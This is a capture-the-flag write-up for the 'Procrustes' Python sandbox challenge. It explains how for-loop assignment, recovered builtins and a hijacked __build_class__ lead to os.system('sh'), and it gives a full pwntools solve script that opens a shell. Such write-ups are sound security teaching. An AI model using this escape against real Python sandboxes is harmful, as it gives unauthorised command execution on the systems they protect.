# Procrustes

## Challenge Overview
The challenge presents a Python sandbox that restricts the execution of arbitrary code through strict Abstract Syntax Tree filtering and a regular expression whitelist. The Abstract Syntax Tree whitelist only allows a very limited set of nodes, such as `Module`, `For`, `Tuple`, `Store`, `Load`, `Expr`, `ClassDef`, `Global`, `Name`, and `Attribute`. Additionally, a regular expression enforces that only lowercase letters, underscores, colons, dots, commas, and whitespace can be used. Furthermore, several dangerous builtins are deleted from the execution environment.

## Vulnerability and Exploitation
The core vulnerability lies in the fact that we can still use `for` loops to perform variable assignments and `class` definitions to trigger `__build_class__`.

1. **Variable Assignment via For Loops:** Since the `Assign` node is blacklisted, we can use a single iteration `for` loop over a tuple to assign values to variables. For instance, `for x in y,:` assigns `y` to `x`.
2. **Recovering Builtins:** The sandbox provides a restricted `__builtins__` dictionary containing only `__build_class__`. However, `__build_class__` is a bound method of the original `builtins` module. We can access the original, unmodified builtins using `__build_class__.__self__`.
3. **Class Instantiation Gadget:** By overriding `__builtins__.__build_class__` with a custom class, we can intercept any subsequent `class` definitions. When a new class is defined, our custom class is instantiated.
4. **Arbitrary Code Execution:** We create a custom class and assign its `__getattribute__` method to `__loader__.load_module`. When we define a dummy class, it instantiates our custom class. Accessing an attribute like `.os` on this instance calls `__loader__.load_module("os")`, which loads the `os` module. We then repeat this process, pointing `__getattribute__` to the newly loaded `os.system`. Finally, accessing `.sh` on the new instance executes `os.system("sh")`.

## Solve Script
The complete solution is implemented in the provided script:

```python
from pwn import *


r = remote("localhost", 7000)


data = (b"""global __name__, tmp_build_class

for __name__ in __build_class__,:__build_class__

class update_builtins:
	global __builtins__
	for __builtins__ in __build_class__.__self__,:__name__

for tmp_build_class in __build_class__,:__name__

class g:
	global call_gadget_instance

	class call_gadget:
		for __init__ in print,:__name__
		for __getattribute__ in __loader__.load_module,:__name__

	for __builtins__.__build_class__ in call_gadget,:__name__
	class call_gadget_instance:__name__

	for __builtins__.__build_class__ in tmp_build_class,:__name__

	class call_gadget:
		for __init__ in print,:__name__
		for __getattribute__ in call_gadget_instance.os.system,:__name__

	for __builtins__.__build_class__ in call_gadget,:__name__

	class call_gadget_instance:__name__
	for __builtins__.__build_class__ in tmp_build_class,:__name__
	for ziopera in call_gadget_instance.sh,:__name__
""".replace(b"\n", b"\r"))

print(len(data))
r.sendline(data)

r.interactive()
```
